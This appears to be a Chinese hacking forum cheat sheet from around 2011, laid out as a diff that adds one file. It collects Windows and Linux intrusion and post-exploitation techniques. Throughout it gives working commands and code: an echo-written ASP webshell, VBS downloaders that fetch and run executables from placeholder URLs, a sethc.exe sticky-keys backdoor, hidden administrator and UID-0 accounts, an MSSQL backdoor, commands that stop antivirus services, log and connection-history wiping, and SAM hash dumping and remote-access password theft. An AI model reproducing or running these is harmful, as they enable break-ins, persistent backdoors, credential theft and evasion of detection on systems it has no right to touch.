@@ -1,0 +1,1243 @@
+旁站路径问题
+1、读网站配置。
+2、用以下VBS
+On Error Resume Next
+If (LCase(Right(WScript.Fullname,11))="wscript.exe") Then
+        
+
+Msgbox Space(12) & "IIS Virtual Web Viewer" & Space(12) & Chr(13) & Space(9) & " 
+
+Usage:Cscript vWeb.vbs",4096,"Lilo"
+        WScript.Quit
+End If
+Set ObjService=GetObject
+
+("IIS://LocalHost/W3SVC")
+For Each obj3w In objservice
+        If IsNumeric(obj3w.Name) 
+
+Then
+                Set OService=GetObject("IIS://LocalHost/W3SVC/" & obj3w.Name)
+         
+
+       Set VDirObj = OService.GetObject("IIsWebVirtualDir", "ROOT")
+                If Err 
+
+<> 0 Then WScript.Quit (1)
+                WScript.Echo Chr(10) & "[" & 
+
+OService.ServerComment & "]"
+                For Each Binds In OService.ServerBindings
+     
+
+                   Web = "{ " & Replace(Binds,":"," } { ") & " }"
+                        
+
+WScript.Echo Replace(Split(Replace(Web," ",""),"}{")(2),"}","")
+                Next
+       
+
+         WScript.Echo "Path            : " & VDirObj.Path
+        End If
+Next
+复制代码
+3、iis_spy列举（注：需要支持ASPX，反IISSPY的方法：将activeds.dll，activeds.tlb降权）
+4、得到目标站目录，不能直接跨的。通过echo  ^<%execute(request("cmd"))%^> >>X:\目标目录\X.asp 或者copy 脚本文件 X:\目标目录\X.asp  像目标目录写入webshell。或者还可以试试type命令.
+—————————————————————
+WordPress的平台，爆绝对路径的方法是：
+url/wp-content/plugins/akismet/akismet.php
+url/wp-content/plugins/akismet/hello.php
+——————————————————————
+phpMyAdmin暴路径办法:
+phpMyAdmin/libraries/select_lang.lib.php
+phpMyAdmin/darkblue_orange/layout.inc.php
+phpMyAdmin/index.php?lang[]=1
+phpmyadmin/themes/darkblue_orange/layout.inc.php
+————————————————————
+网站可能目录(注：一般是虚拟主机类）
+data/htdocs.网站/网站/
+————————————————————
+CMD下操作VPN相关
+netsh ras set user administrator permit #允许administrator拨入该VPN
+netsh ras set user administrator deny #禁止administrator拨入该VPN
+netsh ras show user #查看哪些用户可以拨入VPN
+netsh ras ip show config #查看VPN分配IP的方式
+netsh ras ip set addrassign method = pool #使用地址池的方式分配IP
+netsh ras ip add range from = 192.168.3.1 to = 192.168.3.254 #地址池的范围是从192.168.3.1到192.168.3.254
+————————————————————
+命令行下添加SQL用户的方法
+需要有管理员权限,在命令下先建立一个c:\test.qry文件,内容如下:
+exec master.dbo.sp_addlogin test,123
+EXEC sp_addsrvrolemember 'test, 'sysadmin'
+然后在DOS下执行:cmd.exe /c isql -E /U alma /P /i c:\test.qry
+
+另类的加用户方法
+在删掉了net.exe和不用adsi之外，新的加用户的方法。代码如下：
+js:
+var o=new ActiveXObject( "Shell.Users" );
+z=o.create("test") ;
+z.changePassword("123456","")
+z.setting("AccountType")=3;
+
+vbs:
+Set   o=CreateObject( "Shell.Users" )
+Set z=o.create("test")
+z.changePassword "123456",""
+z.setting("AccountType")=3
+——————————————————
+cmd访问控制权限控制（注：反everyone不可读，工具-文件夹选项-使用简单的共享去掉即可）
+
+命令如下
+cacls c: /e /t /g everyone:F           #c盘everyone权限
+cacls "目录" /d everyone               #everyone不可读，包括admin
+————————以下配合PR更好————
+3389相关
+a、防火墙TCP/IP筛选.（关闭net stop policyagent & net stop sharedaccess）
+b、内网环境（LCX）
+c、终端服务器超出了最大允许连接
+XP 运行mstsc /admin
+2003 运行mstsc /console   
+
+杀软关闭（把杀软所在的文件的所有权限去掉）
+处理变态诺顿企业版：
+net stop "Symantec AntiVirus" /y
+net stop "Symantec AntiVirus Definition Watcher" /y
+net stop "Symantec Event Manager" /y
+net stop "System Event Notification" /y
+net stop "Symantec Settings Manager" /y
+
+卖咖啡：net stop "McAfee McShield" 
+————————————————————
+
+5次SHIFT：
+copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc1.exe
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\dllcache\sethc.exe /y
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y
+——————————————————————
+隐藏账号添加：
+1、net user admin$ 123456 /add&net localgroup administrators admin$ /add
+2、导出注册表SAM下用户的两个键值
+3、在用户管理界面里的admin$删除，然后把备份的注册表导回去。
+4、利用Hacker Defender把相关用户注册表隐藏
+——————————————————————
+MSSQL扩展后门：
+USE master;
+EXEC sp_addextendedproc 'xp_helpsystem', 'xp_helpsystem.dll';
+GRANT exec On xp_helpsystem TO public;
+———————————————————————
+日志处理
+C:\WINNT\system32\LogFiles\MSFTPSVC1>下有
+ex011120.log / ex011121.log / ex011124.log三个文件，
+直接删除 ex0111124.log
+不成功，“原文件...正在使用”
+当然可以直接删除ex011120.log / ex011121.log
+用记事本打开ex0111124.log，删除里面的一些内容后，保存，覆盖退出，成功。
+当停止msftpsvc服务后可直接删除ex011124.log
+
+MSSQL查询分析器连接记录清除：
+MSSQL 2000位于注册表如下：
+HKEY_CURRENT_USER\Software\Microsoft\Microsoft SQL Server\80\Tools\Client\PrefServers
+找到接接过的信息删除。
+MSSQL 2005是在C:\Documents and Settings\<user>\Application Data\Microsoft\Microsoft SQL 
+
+Server\90\Tools\Shell\mru.dat
+—————————————————————————
+防BT系统拦截可使用远程下载shell，也达到了隐藏自身的效果，也可以做为超隐蔽的后门，神马的免杀webshell，用服务器安全工具一扫通通挂掉了）
+
+<%
+Sub eWebEditor_SaveRemoteFile(s_LocalFileName,s_RemoteFileUrl)
+Dim Ads, Retrieval, GetRemoteData
+On Error Resume Next
+Set Retrieval = Server.CreateObject("Microsoft.XMLHTTP")
+With Retrieval
+.Open "Get", s_RemoteFileUrl, False, "", ""
+.Send
+GetRemoteData = .ResponseBody
+End With
+Set Retrieval = Nothing
+Set Ads = Server.CreateObject("Adodb.Stream")
+With Ads
+.Type = 1
+.Open
+.Write GetRemoteData
+.SaveToFile Server.MapPath(s_LocalFileName), 2
+.Cancel()
+.Close()
+End With
+Set Ads=nothing
+End Sub
+
+eWebEditor_SaveRemoteFile"your shell's name","your shell'urL"
+%>
+
+VNC提权方法:
+利用shell读取vnc保存在注册表中的密文，使用工具VNC4X破解
+注册表位置：HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\password
+regedit -e c:\reg.dll "HKEY_LOCAL_MACHINE\SOFTWARE\ORL"
+regedit -e c:\reg.dll "HKEY_LOCAL_MACHINE\Software\RealVNC\WinVNC4"
+Radmin 默认端口是4899，
+HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter//默认密码注册表位置
+HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port //默认端口注册表位置
+然后用HASH版连接。
+如果我们拿到一台主机的WEBSEHLL。通过查找发现其上安装有PCANYWHERE 同时保存密码文件的目录是允许我们的IUSER权限访问，我们可以下载这个CIF文件到本地破解，再通过PCANYWHERE从本机登陆服务器。
+保存密码的CIF文件,不是位于PCANYWHERE的安装目录,而且位于安装PCANYWHERE所安装盘的\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\ 如果PCANYWHERE安装在D:\program\文件下下，那么PCANYWHERE的密码文件就保存在D:\Documents and Settings\All 
+Users\Application Data\Symantec\pcAnywhere\文件夹下。
+——————————————————————
+搜狗输入法的PinyinUp.exe是可读可写的直接替换即可
+——————————————————----------
+WinWebMail目录下的web必须设置everyone权限可读可写，在开始程序里，找到WinWebMail快捷方式下下
+来，看路径，访问 路径\web传shell，访问shell后，权限是system，放远控进启动项，等待下次重启。
+没有删cmd组建的直接加用户。
+7i24的web目录也是可写，权限为administrator。
+
+1433 SA点构建注入点。
+<%
+strSQLServerName = "服务器ip"
+strSQLDBUserName = "数据库帐号"
+strSQLDBPassword = "数据库密码"
+strSQLDBName = "数据库名称"
+Set conn = Server.createObject("ADODB.Connection")
+strCon = "Provider=SQLOLEDB.1;Persist Security Info=False;Server=" & strSQLServerName & 
+
+";User ID=" & strSQLDBUserName & ";Password=" & strSQLDBPassword & ";Database=" & 
+
+strSQLDBName & ";"
+conn.open strCon
+dim rs,strSQL,id
+set rs=server.createobject("ADODB.recordset")
+id = request("id")
+strSQL = "select * from ACTLIST where worldid=" & idrs.open strSQL,conn,1,3
+rs.close
+%>
+复制代码
+******liunx 相关******
+一.ldap渗透技巧
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b 
+
+"cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b 
+
+"cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+实战:
+1.cat /etc/nsswitch
+看看密码登录策略我们可以看到使用了file ldap模式
+
+2.less /etc/ldap.conf
+base ou=People,dc=unix-center,dc=net
+找到ou,dc,dc设置
+
+3.查找管理员信息
+匿名方式
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b 
+
+"cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+有密码形式
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b 
+
+"cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2
+
+
+4.查找10条用户记录
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口
+
+渗透实战:
+1.返回所有的属性
+ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s sub "objectclass=*"
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+dn: uid=manager,dc=ruc,dc=edu,dc=cn
+uid: manager
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: manager
+cn: manager
+
+dn: uid=superadmin,dc=ruc,dc=edu,dc=cn
+uid: superadmin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: superadmin
+cn: superadmin
+
+dn: uid=admin,dc=ruc,dc=edu,dc=cn
+uid: admin
+objectClass: inetOrgPerson
+objectClass: organizationalPerson
+objectClass: person
+objectClass: top
+sn: admin
+cn: admin
+
+dn: uid=dcp_anonymous,dc=ruc,dc=edu,dc=cn
+uid: dcp_anonymous
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+sn: dcp_anonymous
+cn: dcp_anonymous
+
+2.查看基类
+bash-3.00# ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s base "objectclass=*" | 
+
+more
+version: 1
+dn: dc=ruc,dc=edu,dc=cn
+dc: ruc
+objectClass: domain
+
+3.查找
+bash-3.00# ldapsearch -h 192.168.7.33 -b "" -s base "objectclass=*"
+version: 1
+dn:
+objectClass: top
+namingContexts: dc=ruc,dc=edu,dc=cn
+supportedExtension: 2.16.840.1.113730.3.5.7
+supportedExtension: 2.16.840.1.113730.3.5.8
+supportedExtension: 1.3.6.1.4.1.4203.1.11.1
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.25
+supportedExtension: 2.16.840.1.113730.3.5.3
+supportedExtension: 2.16.840.1.113730.3.5.5
+supportedExtension: 2.16.840.1.113730.3.5.6
+supportedExtension: 2.16.840.1.113730.3.5.4
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.1
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.2
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.3
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.4
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.5
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.6
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.7
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.8
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.9
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.23
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.11
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.12
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.13
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.14
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.15
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.16
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.17
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.18
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.19
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.21
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.22
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.24
+supportedExtension: 1.3.6.1.4.1.1466.20037
+supportedExtension: 1.3.6.1.4.1.4203.1.11.3
+supportedControl: 2.16.840.1.113730.3.4.2
+supportedControl: 2.16.840.1.113730.3.4.3
+supportedControl: 2.16.840.1.113730.3.4.4
+supportedControl: 2.16.840.1.113730.3.4.5
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.16
+supportedControl: 2.16.840.1.113730.3.4.15
+supportedControl: 2.16.840.1.113730.3.4.17
+supportedControl: 2.16.840.1.113730.3.4.19
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.2
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.6
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.8
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1
+supportedControl: 2.16.840.1.113730.3.4.14
+supportedControl: 1.3.6.1.4.1.1466.29539.12
+supportedControl: 2.16.840.1.113730.3.4.12
+supportedControl: 2.16.840.1.113730.3.4.18
+supportedControl: 2.16.840.1.113730.3.4.13
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 2
+supportedLDAPVersion: 3
+vendorName: Sun Microsystems, Inc.
+vendorVersion: Sun-Java(tm)-System-Directory/6.2
+dataversion: 020090516011411
+netscapemdsuffix: cn=ldap://dc=webA:389
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_RSA_WITH_AES_256_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_MD5
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_SHA
+supportedSSLCiphers: TLS_RSA_WITH_AES_128_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_3DES_EDE_CBC_SHA
+supportedSSLCiphers: SSL_DHE_RSA_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_DHE_DSS_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_WITH_DES_CBC_SHA
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_RC4_56_SHA
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC4_40_MD5
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_NULL_SHA
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_NULL_SHA
+supportedSSLCiphers: SSL_RSA_WITH_NULL_SHA
+supportedSSLCiphers: SSL_RSA_WITH_NULL_MD5
+supportedSSLCiphers: SSL_CK_RC4_128_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_DES_192_EDE3_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_DES_64_CBC_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC4_128_EXPORT40_WITH_MD5
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5
+————————————
+2. NFS渗透技巧
+showmount -e ip
+列举IP
+——————
+3.rsync渗透技巧
+1.查看rsync服务器上的列表
+rsync 210.51.X.X::
+finance
+img_finance
+auto
+img_auto
+html_cms
+img_cms
+ent_cms
+ent_img
+ceshi
+res_img
+res_img_c2
+chip
+chip_c2
+ent_icms
+games
+gamesimg
+media
+mediaimg
+fashion
+res-fashion
+res-fo
+taobao-home
+res-taobao-home
+house
+res-house
+res-home
+res-edu
+res-ent
+res-labs
+res-news
+res-phtv
+res-media
+home
+edu
+news
+res-book
+
+看相应的下级目录(注意一定要在目录后面添加上/)
+
+
+rsync 210.51.X.X::htdocs_app/
+rsync 210.51.X.X::auto/
+rsync 210.51.X.X::edu/
+
+2.下载rsync服务器上的配置文件
+rsync -avz 210.51.X.X::htdocs_app/ /tmp/app/
+
+3.向上更新rsync文件(成功上传,不会覆盖)
+rsync -avz nothack.php 210.51.X.X::htdocs_app/warn/
+http://app.finance.xxx.com/warn/nothack.txt
+
+四.squid渗透技巧
+nc -vv baidu.com 80
+GET HTTP://www.sina.com / HTTP/1.0
+GET HTTP://WWW.sina.com:22 / HTTP/1.0
+五.SSH端口转发
+ssh -C -f -N -g -R 44:127.0.0.1:22 cnbird@ip
+
+六.joomla渗透小技巧
+确定版本
+index.php?option=com_content&view=article&id=30:what-languages-are-supported-by-joomla-
+
+15&catid=32:languages&Itemid=47
+
+重新设置密码
+index.php?option=com_user&view=reset&layout=confirm
+
+七: Linux添加UID为0的root用户
+useradd -o -u 0 nothack
+
+八.freebsd本地提权
+[argp@julius ~]$ uname -rsi
+* freebsd 7.3-RELEASE GENERIC
+* [argp@julius ~]$ sysctl vfs.usermount
+* vfs.usermount: 1
+* [argp@julius ~]$ id
+* uid=1001(argp) gid=1001(argp) groups=1001(argp)
+* [argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex
+* [argp@julius ~]$ ./nfs_mount_ex
+*
+calling nmount()
+
+（注：本文原件由0x童鞋收集整理，感谢0x童鞋，本人补充和优化了点，本文毫无逻辑可言，因为是想到什么就写了，大家见谅）
+——————————————
+感谢T00LS的童鞋们踊跃交流，让我学到许多经验，为了方便其他童鞋浏览，将T00LS的童鞋们补充的贴在下面，同时我也会以后将自己的一些想法跟新在后面。
+————————————————————————————
+1、tar打包            tar -cvf /home/public_html/*.tar /home/public_html/--exclude= 排除文件*.gif   排除目录 /xx/xx/*
+alzip打包(韩国) alzip -a D:\WEB\ d:\web\*.rar
+{
+注：
+关于tar的打包方式,linux不以扩展名来决定文件类型。
+若压缩的话tar -ztf *.tar.gz   查看压缩包里内容     tar -zxf *.tar.gz 解压
+那么用这条比较好 tar -czf /home/public_html/*.tar.gz /home/public_html/--exclude= 排除文件*.gif   排除目录 /xx/xx/*
+}  
+
+提权先执行systeminfo
+token 漏洞补丁号 KB956572
+Churrasco          kb952004
+命令行RAR打包~~·
+rar a -k -r -s -m3 c:\1.rar c:\folder
+——————————————
+2、收集系统信息的脚本  
+for window：
+
+@echo off
+echo #########system info collection
+systeminfo
+ver
+hostname
+net user
+net localgroup
+net localgroup administrators
+net user guest
+net user administrator
+
+echo #######at- with   atq#####
+echo schtask /query
+
+echo
+echo ####task-list#############
+tasklist /svc
+echo
+echo ####net-work infomation
+ipconfig/all
+route print
+arp -a
+netstat -anipconfig /displaydns
+echo
+echo #######service############
+sc query type= service state= all
+echo #######file-##############
+cd \
+tree -F
+for linux：
+
+#!/bin/bash
+
+echo #######geting sysinfo####
+echo ######usage: ./getinfo.sh >/tmp/sysinfo.txt
+echo #######basic infomation##
+cat /proc/meminfo
+echo
+cat /proc/cpuinfo
+echo
+rpm -qa 2>/dev/null
+######stole the mail......######
+cp -a /var/mail /tmp/getmail 2>/dev/null
+
+
+echo 'u'r id is' `id`
+echo ###atq&crontab#####
+atq
+crontab -l
+echo #####about var#####
+set
+
+echo #####about network###
+####this is then point in pentest,but i am a new bird,so u need to add some in it
+cat /etc/hosts
+hostname
+ipconfig -a
+arp -v
+echo ########user####
+cat /etc/passwd|grep -i sh
+
+echo ######service####
+chkconfig --list
+
+for i in {oracle,mysql,tomcat,samba,apache,ftp}
+cat /etc/passwd|grep -i $i
+done
+
+locate passwd >/tmp/password 2>/dev/null
+sleep 5
+locate password >>/tmp/password 2>/dev/null
+sleep 5
+locate conf >/tmp/sysconfig 2>dev/null
+sleep 5
+locate config >>/tmp/sysconfig 2>/dev/null
+sleep 5
+
+###maybe can use "tree /"###
+echo ##packing up#########
+tar cvf getsysinfo.tar /tmp/getmail /tmp/password /tmp/sysconfig
+rm -rf /tmp/getmail /tmp/password /tmp/sysconfig
+——————————————
+3、ethash 不免杀怎么获取本机hash。
+首先导出注册表 regedit /e d:\aa.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users"   （2000）
+               reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users" d:\aa.reg  （2003）
+注意权限问题，一般注册表默认sam目录是不能访问的。需要设置为完全控制以后才可以访问（界面登录的需要注意，system权限可以忽略）
+接下来就简单了，把导出的注册表，down 到本机，修改注册表头导入本机，然后用抓去hash的工具抓本地用户就OK了
+hash 抓完了记得把自己的账户密码改过来哦！
+据我所知，某人是用这个方法虚拟机多次因为不知道密码而进不去！~
+——————————————
+4、vbs 下载者
+1
+echo Set sGet = createObject("ADODB.Stream") >>c:\windows\cftmon.vbs
+echo sGet.Mode = 3 >>c:\windows\cftmon.vbs
+echo sGet.Type = 1 >>c:\windows\cftmon.vbs
+echo sGet.Open() >>c:\windows\cftmon.vbs
+echo sGet.Write(xPost.responseBody) >>c:\windows\cftmon.vbs
+echo sGet.SaveToFile "c:\windows\e.exe",2 >>c:\windows\cftmon.vbs
+echo Set objShell = CreateObject("Wscript.Shell") >>c:\windows\cftmon.vbs
+echo objshell.run """c:\windows\e.exe""" >>c:\windows\cftmon.vbs
+cftmon.vbs
+
+2
+On Error Resume Next:Dim iRemote,iLocal,s1,s2
+iLocal = LCase(WScript.Arguments(1)):iRemote = LCase(WScript.Arguments(0))  
+s1="Mi"+"cro"+"soft"+"."+"XML"+"HTTP":s2="ADO"+"DB"+"."+"Stream"
+Set xPost = CreateObject(s1):xPost.Open "GET",iRemote,0:xPost.Send()
+Set sGet = CreateObject(s2):sGet.Mode=3:sGet.Type=1:sGet.Open()
+sGet.Write(xPost.responseBody):sGet.SaveToFile iLocal,2
+
+cscript c:\down.vbs http://xxxx/mm.exe c:\mm.exe
+
+当GetHashes获取不到hash时，可以用兵刃把sam复制到桌面
+——————————————————
+5、
+1.查询终端端口
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+2.开启XP&2003终端服务
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+3.更改终端端口为2008(0x7d8)
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f
+4.取消xp&2003系统防火墙对终端服务的限制及IP连接的限制
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@  xpsp2res.dll,-22009 /f
+————————————————
+6、create table a (cmd text);
+insert into a values ("set wshshell=createobject (""wscript.shell"")");
+insert into a values ("a=wshshell.run (""cmd.exe /c net user admin admin /add"",0)");
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators admin /add"",0)");  
+select * from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";
+————————————————————
+7、BS马的PortMap功能，类似LCX做转发。若果支持ASPX，用这个转发会隐蔽点。（注：一直忽略了在偏僻角落的那个功能）
+_____
+8、for /d %i in (d:\freehost\*) do @echo %i
+
+列出d的所有目录
+  
+  for /d %i in (???) do @echo %i
+
+把当前路径下文件夹的名字只有1-3个字母的打出来
+
+2.for /r %i in (*.exe) do @echo %i
+  
+以当前目录为搜索路径.会把目录与下面的子目录的全部EXE文件列出
+
+for /r f:\freehost\hmadesign\web\ %i in (*.*) do @echo %i
+
+3.for /f %i in (c:\1.txt) do echo %i 
+  
+  //这个会显示a.txt里面的内容，因为/f的作用，会读出a.txt中
+
+4.for /f "tokens=2 delims= " %i in (a.txt) do echo %i
+
+  delims=后的空格是分隔符 tokens是取第几个位置
+——————————
+●注册表:
+1.Administrator注册表备份:
+reg export HKLM\SAM\SAM\Domains\Account\Users\000001F4 c:\1f4.reg
+
+2.修改3389的默认端口:
+HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+修改PortNumber.
+
+3.清除3389登录记录:
+reg delete "HKCU\Software\Microsoft\Terminal Server Client"  /f
+
+4.Radmin密码:
+reg export HKLM\SYSTEM\RAdmin c:\a.reg
+
+5.禁用TCP/IP端口筛选(需重启):
+REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f
+
+6.IPSec默认免除项88端口(需重启):
+reg add HKLM\SYSTEM\CurrentControlSet\Services\IPSEC /v NoDefaultExempt /t REG_DWORD /d 0 /f
+或者
+netsh ipsec dynamic set config ipsecexempt value=0
+
+7.停止指派策略"myipsec":
+netsh ipsec static set policy name="myipsec" assign=n
+
+8.系统口令恢复LM加密:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel /t REG_DWORD /d 0 /f
+
+9.另类方法抓系统密码HASH
+reg save hklm\sam c:\sam.hive
+reg save hklm\system c:\system.hive
+reg save hklm\security c:\security.hive
+
+10.shift映像劫持
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v debugger /t REG_sz /d cmd.exe
+
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
+-----------------------------------
+星外vbs(注：测试通过，好东西）
+Set ObjService=GetObject("IIS://LocalHost/W3SVC") 
+For Each obj3w In objservice 
+childObjectName=replace(obj3w.AdsPath,Left(obj3w.Adspath,22),"")
+if IsNumeric(childObjectName)=true then
+set IIs=objservice.GetObject("IIsWebServer",childObjectName)
+if err.number<>0 then
+exit for
+msgbox("error!")
+wscript.quit
+end if
+serverbindings=IIS.serverBindings
+ServerComment=iis.servercomment
+set IISweb=iis.getobject("IIsWebVirtualDir","Root")
+user=iisweb.AnonymousUserName
+pass=iisweb.AnonymousUserPass
+path=IIsWeb.path
+list=list&servercomment&" "&user&" "&pass&" "&join(serverBindings,",")&" "&path& vbCrLf & vbCrLf
+end if
+Next 
+wscript.echo list 
+Set ObjService=Nothing 
+wscript.echo "from : http://www.xxx.com/" &vbTab&vbCrLf
+WScript.Quit
+复制代码
+----------------------2011新气象，欢迎各位补充、指正、优化。----------------
